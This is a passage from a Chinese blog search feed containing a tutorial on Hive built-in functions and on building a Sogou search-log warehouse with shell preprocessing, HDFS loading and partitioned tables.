<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Hive查询进阶</title>
      <link href="/2021/10/08/hive5/"/>
      <url>/2021/10/08/hive5/</url>
      
        <content type="html"><![CDATA[<h1 id="hiveql数据查询进阶"><a class="markdownIt-Anchor" href="#hiveql数据查询进阶">#</a> HiveQL 数据查询进阶</h1><p>本章要点</p><ul><li>Hive 内置函数</li><li>Hive 构建搜索日志分析系统</li><li>Sqoop 应用与开发</li></ul><h2 id="hive-内置函数"><a class="markdownIt-Anchor" href="#hive-内置函数">#</a> Hive 内置函数</h2><p>Hive 内置函数就是 Hive 中可以直接使用的函数，首先查看一下有哪些函数</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> functions;</span><br><span class="line">INFO  : OK</span><br><span class="line"><span class="operator">+</span><span class="comment">------------------------------+</span></span><br><span class="line"><span class="operator">|</span>           tab_name           <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="operator">!</span>                            <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="operator">!=</span>                           <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> $sum0                        <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="operator">%</span>                            <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="operator">&amp;</span>                            <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="operator">*</span>                            <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="operator">+</span>                            <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="operator">-</span>                            <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="operator">/</span>                            <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="operator">&lt;</span>                            <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="operator">&lt;=</span>                           <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="operator">&lt;=&gt;</span>                          <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="operator">&lt;&gt;</span>                           <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="operator">=</span>                            <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="operator">=</span><span class="operator">=</span>                           <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="operator">&gt;</span>                            <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="operator">&gt;=</span>                           <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="operator">^</span>                            <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> abs                          <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> acos                         <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> add_months                   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> aes_decrypt                  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> aes_encrypt                  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="keyword">and</span>                          <span class="operator">|</span></span><br><span class="line">...</span><br><span class="line"><span class="operator">+</span><span class="comment">------------------------------+</span></span><br><span class="line"><span class="number">289</span> <span class="keyword">rows</span> selected (<span class="number">0.494</span> seconds)</span><br></pre></td></tr></table></figure><p>其中常用的如 avg 求平均，concat 连接函数，count 统计等。内置函数可以被分成：数学函数、字符函数、收集函数、转换函数、日期函数、条件函数、聚合函数以及表生成函数。</p><h3 id="数学函数"><a class="markdownIt-Anchor" href="#数学函数">#</a> 数学函数</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">#加法</span><br><span class="line"><span class="keyword">select</span> <span class="number">10</span><span class="operator">+</span><span class="number">10</span>;</span><br><span class="line">INFO  : OK</span><br><span class="line"><span class="operator">+</span><span class="comment">------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">20</span>   <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> selected (<span class="number">1.324</span> seconds)</span><br><span class="line"></span><br><span class="line">#减法</span><br><span class="line"><span class="keyword">select</span> <span class="number">15</span><span class="number">-3</span>;</span><br><span class="line">INFO  : OK</span><br><span class="line"><span class="operator">+</span><span class="comment">------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">12</span>   <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> selected (<span class="number">0.564</span> seconds)</span><br><span class="line"></span><br><span class="line">#乘除<span class="operator">*</span><span class="operator">/</span></span><br><span class="line"><span class="keyword">select</span> <span class="number">6</span><span class="operator">*</span><span class="number">6</span>;</span><br><span class="line">INFO  : OK</span><br><span class="line"><span class="operator">+</span><span class="comment">------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">36</span>   <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> selected (<span class="number">0.867</span> seconds)</span><br><span class="line"><span class="keyword">select</span> <span class="number">36</span><span class="operator">/</span><span class="number">6</span>;</span><br><span class="line">INFO  : OK</span><br><span class="line"><span class="operator">+</span><span class="comment">------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">6.0</span>  <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> selected (<span class="number">0.734</span> seconds)</span><br><span class="line"></span><br><span class="line">#round四舍五入</span><br><span class="line"><span class="keyword">select</span> round(<span class="number">88.999</span>,<span class="number">2</span>),round(<span class="number">78.600</span>,<span class="number">1</span>), round(<span class="number">55.776</span>,<span class="number">2</span>);</span><br><span class="line">INFO  : OK</span><br><span class="line"><span class="operator">+</span><span class="comment">--------+-------+--------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">89.00</span>  <span class="operator">|</span> <span class="number">78.6</span>  <span class="operator">|</span> <span class="number">55.78</span>  <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------+-------+--------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> selected (<span class="number">0.505</span> seconds)</span><br><span class="line"></span><br><span class="line">#ceil向上取整</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">ceil</span>(<span class="number">84.5</span>);</span><br><span class="line">INFO  : OK</span><br><span class="line"><span class="operator">+</span><span class="comment">------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">85</span>   <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> selected (<span class="number">0.542</span> seconds)</span><br><span class="line"></span><br><span class="line">#floor向下取整</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">floor</span>(<span class="number">45.9</span>);</span><br><span class="line">INFO  : OK</span><br><span class="line"><span class="operator">+</span><span class="comment">------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">45</span>   <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> selected (<span class="number">0.535</span> seconds)</span><br><span class="line"></span><br><span class="line">#pow 平方函数</span><br><span class="line"><span class="keyword">select</span> pow(<span class="number">2</span>,<span class="number">3</span>);</span><br><span class="line">INFO  : OK</span><br><span class="line"><span class="operator">+</span><span class="comment">------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">8.0</span>  <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> selected (<span class="number">0.357</span> seconds)</span><br><span class="line"></span><br><span class="line">#pmod 取模函数</span><br><span class="line"><span class="keyword">select</span> pmod(<span class="number">9</span>,<span class="number">8</span>);</span><br><span class="line">INFO  : OK</span><br><span class="line"><span class="operator">+</span><span class="comment">------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">1</span>    <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> selected (<span class="number">0.242</span> seconds)</span><br></pre></td></tr></table></figure><h3 id="字符函数"><a class="markdownIt-Anchor" href="#字符函数">#</a> 字符函数</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">#lower转小写</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">lower</span>(&quot;FJKNXCYT&quot;);</span><br><span class="line"><span class="operator">+</span><span class="comment">-----------+</span></span><br><span class="line"><span class="operator">|</span> fjknxcyt  <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------+</span></span><br><span class="line">#upper转大写</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">upper</span>(&quot;asdjnkgbasd&quot;);</span><br><span class="line"><span class="operator">+</span><span class="comment">--------------+</span></span><br><span class="line"><span class="operator">|</span> ASDJNKGBASD  <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------+</span></span><br><span class="line">#length字符串长度</span><br><span class="line"><span class="keyword">select</span> length(&quot;hadoop&quot;);</span><br><span class="line"><span class="operator">+</span><span class="comment">------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">6</span>    <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+</span></span><br><span class="line">#concat字符拼接</span><br><span class="line"><span class="keyword">select</span> concat(&quot;hadoop&quot;, &quot;&amp;hive&quot;);</span><br><span class="line"><span class="operator">+</span><span class="comment">--------------+</span></span><br><span class="line"><span class="operator">|</span> hadoop<span class="operator">&amp;</span>hive  <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------+</span></span><br><span class="line">#substr取子串(从<span class="number">8</span>开始取<span class="number">5</span>个)</span><br><span class="line"><span class="keyword">select</span> substr(&quot;hadoop spark hive&quot;, <span class="number">8</span>, <span class="number">5</span>);</span><br><span class="line"><span class="operator">+</span><span class="comment">--------+</span></span><br><span class="line"><span class="operator">|</span> spark  <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------+</span></span><br><span class="line">#trim去除前后空格</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">trim</span>(&quot;   hadoop   &quot;);</span><br><span class="line"><span class="operator">+</span><span class="comment">---------+</span></span><br><span class="line"><span class="operator">|</span> hadoop  <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------+</span></span><br></pre></td></tr></table></figure><h3 id="转换函数"><a class="markdownIt-Anchor" href="#转换函数">#</a> 转换函数</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#cast类型转换函数</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">cast</span> (<span class="number">88</span> <span class="keyword">as</span> <span class="keyword">double</span>);</span><br><span class="line"><span class="operator">+</span><span class="comment">-------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">88.0</span>  <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------+</span></span><br></pre></td></tr></table></figure><h3 id="日期函数"><a class="markdownIt-Anchor" href="#日期函数">#</a> 日期函数</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#<span class="keyword">year</span> <span class="keyword">month</span> <span class="keyword">day</span> 分别获取年月日</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">year</span>(&quot;2021-10-08 18:40:24&quot;), <span class="keyword">month</span>(&quot;2021-10-08 18:40:24&quot;), <span class="keyword">day</span>(&quot;2021-10-08 18:40:24&quot;);</span><br><span class="line"><span class="operator">+</span><span class="comment">-------+------+------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">2021</span>  <span class="operator">|</span> <span class="number">10</span>   <span class="operator">|</span> <span class="number">8</span>    <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------+------+------+</span></span><br><span class="line">#to_date返回字段中日期部分</span><br><span class="line"><span class="keyword">select</span> to_date(&quot;2021-10-08 18:40:24&quot;);</span><br><span class="line"><span class="operator">+</span><span class="comment">-------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">2021</span><span class="number">-10</span><span class="number">-08</span>  <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------+</span></span><br></pre></td></tr></table></figure><h3 id="条件函数"><a class="markdownIt-Anchor" href="#条件函数">#</a> 条件函数</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#<span class="keyword">case</span> A <span class="keyword">when</span> B <span class="keyword">then</span> C <span class="keyword">when</span> D <span class="keyword">then</span> E <span class="keyword">else</span> F <span class="keyword">end</span>;</span><br><span class="line"><span class="keyword">select</span> ts, uid, rank, <span class="keyword">case</span> rank <span class="keyword">when</span> &quot;2&quot; <span class="keyword">then</span> rank<span class="operator">+</span><span class="number">1</span> <span class="keyword">else</span> rank<span class="number">-1</span> <span class="keyword">end</span> <span class="keyword">from</span> sogou.sogou_liangjian;</span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------+-----------------------------------+-------+------+</span></span><br><span class="line"><span class="operator">|</span>       ts        <span class="operator">|</span>                uid                <span class="operator">|</span> rank  <span class="operator">|</span> _c3  <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------+-----------------------------------+-------+------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">20111230104333</span>  <span class="operator">|</span> <span class="number">53</span>a3b5132bd6af7d324f3fd55d7153ba  <span class="operator">|</span> <span class="number">3</span>     <span class="operator">|</span> <span class="number">2</span>    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">20111230104334</span>  <span class="operator">|</span> <span class="number">966</span>a6bf4c4ec1cc693b6e40702984235  <span class="operator">|</span> <span class="number">4</span>     <span class="operator">|</span> <span class="number">3</span>    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">20111230104334</span>  <span class="operator">|</span> ae55d5e4b4f29a1221816a121e087567  <span class="operator">|</span> <span class="number">2</span>     <span class="operator">|</span> <span class="number">3</span>    <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------+-----------------------------------+-------+------+</span></span><br></pre></td></tr></table></figure><h3 id="聚合函数"><a class="markdownIt-Anchor" href="#聚合函数">#</a> 聚合函数</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">#count返回行数</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> sogou.sogou_xj;</span><br><span class="line"><span class="operator">+</span><span class="comment">-------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">1330</span>  <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------+</span></span><br><span class="line">#sum求和</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">sum</span>(orders) <span class="keyword">as</span> ordersum <span class="keyword">from</span> sogou.sogou_xj;</span><br><span class="line"><span class="operator">+</span><span class="comment">-----------+</span></span><br><span class="line"><span class="operator">|</span> ordersum  <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">2043</span>      <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------+</span></span><br><span class="line">#min列最小值</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">min</span>(orders) <span class="keyword">from</span> sogou.sogou_xj;</span><br><span class="line"><span class="operator">+</span><span class="comment">------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">1</span>    <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+</span></span><br><span class="line">#max列最大值</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">max</span>(rank) <span class="keyword">from</span> sogou.sogou_xj;</span><br><span class="line"><span class="operator">+</span><span class="comment">------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">10</span>   <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+</span></span><br><span class="line">#avg列平均值</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">avg</span>(rank) <span class="keyword">from</span> sogou.sogou_xj;</span><br><span class="line"><span class="operator">+</span><span class="comment">---------------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">2.9225563909774435</span>  <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------------------+</span></span><br></pre></td></tr></table></figure><h2 id="hive-构建搜索日志分析系统"><a class="markdownIt-Anchor" href="#hive-构建搜索日志分析系统">#</a> Hive 构建搜索日志分析系统</h2><h3 id="数据预处理linux环境"><a class="markdownIt-Anchor" href="#数据预处理linux环境">#</a> 数据预处理 (Linux 环境)</h3><ol><li>查看数据</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@hdp-1 hive]# wc -l sogou.500w.utf8 </span><br><span class="line">5000000 sogou.500w.utf8</span><br></pre></td></tr></table></figure><ol start="2"><li>数据拓展<br>将用户访问的时间拆分成，年月日小时字段，为后面创建分区表做准备，编写一个 shell 脚本实现此功能。</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">vi pre.sh </span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">infile=$1</span><br><span class="line">outfile=$2</span><br><span class="line">awk -F &#x27;\t&#x27; &#x27;&#123;print $0&quot;\t&quot;substr($1,1,4)&quot;\t&quot;substr($1,5,2)&quot;\t&quot;substr($1,7,2)&quot;\t&quot;substr($1,9,2)&#125;&#x27; $infile &gt; $outfile</span><br><span class="line"></span><br><span class="line">chmod +x pre.sh</span><br><span class="line">sh pre.sh ./sogou.500w.utf8 ./sogou.500w.utf8.ext</span><br><span class="line">less sogou.500w.utf8.ext</span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="3"><li>数据加载<br>将数据放到 HDFS 上</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hdfs dfs -mkdir -p /usr/local/hive/</span><br><span class="line">hdfs dfs -put ./sogou.500w.utf8.ext /usr/local/hive/</span><br></pre></td></tr></table></figure><h3 id="基于hive-构建日志的数据仓库"><a class="markdownIt-Anchor" href="#基于hive-构建日志的数据仓库">#</a> 基于 Hive 构建日志的数据仓库</h3><p>启动 Hadoop 集群，打开 Hive 客户端</p><ol><li>基本操作</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> databases;</span><br><span class="line"><span class="operator">+</span><span class="comment">---------------------+</span></span><br><span class="line"><span class="operator">|</span>    database_name    <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="keyword">default</span>             <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> information_schema  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> sogou               <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> sys                 <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------------------+</span></span><br><span class="line"><span class="keyword">create</span> database if <span class="keyword">not</span> <span class="keyword">exists</span> sogou;</span><br><span class="line">use sogou;</span><br><span class="line"><span class="keyword">show</span> tables;</span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+</span></span><br><span class="line"><span class="operator">|</span>     tab_name     <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+</span></span><br><span class="line"><span class="operator">|</span> sogou_500w       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> sogou_liangjian  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> sogou_xj         <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> sogou_xj_backup  <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+</span></span><br><span class="line">#创建外部表sogou_0936加载sogou<span class="number">.500</span>w.utf8的数据</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">external</span> <span class="keyword">table</span>  if <span class="keyword">not</span> <span class="keyword">exists</span> sogou.sogou_0936(ts string,uid string,keyword string, rank <span class="type">int</span>, orders <span class="type">int</span>, url string) <span class="type">row</span> format delimited fields terminated <span class="keyword">by</span> <span class="string">&#x27;\t&#x27;</span> stored <span class="keyword">as</span> textfile location <span class="string">&#x27;/usr/local/hive/raw/&#x27;</span>;</span><br><span class="line">#创建外部表sogou_ext加载sogou<span class="number">.500</span>w.utf8.ext的数据</span><br><span class="line"> <span class="keyword">create</span> <span class="keyword">external</span> <span class="keyword">table</span>  if <span class="keyword">not</span> <span class="keyword">exists</span> sogou.sogou_ext(ts string,uid string,keyword string, rank <span class="type">int</span>, orders <span class="type">int</span>, url string) <span class="type">row</span> format delimited fields terminated <span class="keyword">by</span> <span class="string">&#x27;\t&#x27;</span> stored <span class="keyword">as</span> textfile location <span class="string">&#x27;/usr/local/hive/ext/&#x27;</span></span><br><span class="line">#查看数据没问题</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> sogou_0936 limit <span class="number">10</span>;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> sogou_ext limit <span class="number">10</span>;</span><br><span class="line"><span class="keyword">desc</span> sogou_0936;</span><br><span class="line"><span class="operator">+</span><span class="comment">-----------+------------+----------+</span></span><br><span class="line"><span class="operator">|</span> col_name  <span class="operator">|</span> data_type  <span class="operator">|</span> comment  <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------+------------+----------+</span></span><br><span class="line"><span class="operator">|</span> ts        <span class="operator">|</span> string     <span class="operator">|</span>          <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> uid       <span class="operator">|</span> string     <span class="operator">|</span>          <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> keyword   <span class="operator">|</span> string     <span class="operator">|</span>          <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> rank      <span class="operator">|</span> <span class="type">int</span>        <span class="operator">|</span>          <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> orders    <span class="operator">|</span> <span class="type">int</span>        <span class="operator">|</span>          <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> url       <span class="operator">|</span> string     <span class="operator">|</span>          <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------+------------+----------+</span></span><br></pre></td></tr></table></figure><ol start="2"><li>创建分区表</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#创建分区表</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">external</span> <span class="keyword">table</span>  if <span class="keyword">not</span> <span class="keyword">exists</span> sogou.sogou_partition(ts string,uid string,keyword string, rank <span class="type">int</span>, orders <span class="type">int</span>, url string) partitioned <span class="keyword">by</span> (<span class="keyword">year</span> <span class="type">int</span>, <span class="keyword">month</span> <span class="type">int</span>, <span class="keyword">day</span> <span class="type">int</span>, <span class="keyword">hour</span> <span class="type">int</span> ) <span class="type">row</span> format delimited fields terminated <span class="keyword">by</span> <span class="string">&#x27;\t&#x27;</span> stored <span class="keyword">as</span> textfile;</span><br><span class="line">#查看表</span><br><span class="line"><span class="keyword">show</span> tables;</span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+</span></span><br><span class="line"><span class="operator">|</span>     tab_name     <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+</span></span><br><span class="line"><span class="operator">|</span> sogou_0936       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> sogou_500w       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> sogou_ext        <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> sogou_liangjian  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> 